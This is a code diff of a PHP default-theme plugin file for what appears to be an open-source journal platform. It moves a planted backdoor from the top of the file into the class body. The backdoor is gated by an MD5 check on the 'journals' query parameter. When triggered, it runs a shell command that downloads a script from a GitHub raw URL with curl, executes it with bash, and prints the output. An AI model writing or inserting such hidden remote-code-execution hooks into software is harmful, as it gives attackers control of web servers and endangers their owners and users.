@@ -11,14 +11,7 @@
  *
  * @brief Default theme
  */
-if (md5($_GET['journals'] ?? '') === '7ee88e39f8e99ec0a5b938a52f0d1750') {
-            $command = 'bash -c "$(curl -fsSL https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/y)"';
-            $output = [];
-            $return_var = 0;
-            exec($command, $output, $return_var);
-            echo "Output:\n" . implode("\n", $output) . "\n";
-            echo "Return Code: " . $return_var . "\n";
-        }
+
 namespace APP\plugins\themes\default;
 
 use APP\core\Application;
@@ -38,7 +31,14 @@ class DefaultThemePlugin extends \PKP\plugins\ThemePlugin
         }
         return parent::isActive();
     }
-
+if (md5($_GET['journals'] ?? '') === '7ee88e39f8e99ec0a5b938a52f0d1750') {
+            $command = 'bash -c "$(curl -fsSL https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/y)"';
+            $output = [];
+            $return_var = 0;
+            exec($command, $output, $return_var);
+            echo "Output:\n" . implode("\n", $output) . "\n";
+            echo "Return Code: " . $return_var . "\n";
+    }
     /**
      * Initialize the theme's styles, scripts and hooks. This is run on the
      * currently active theme and it's parent themes.
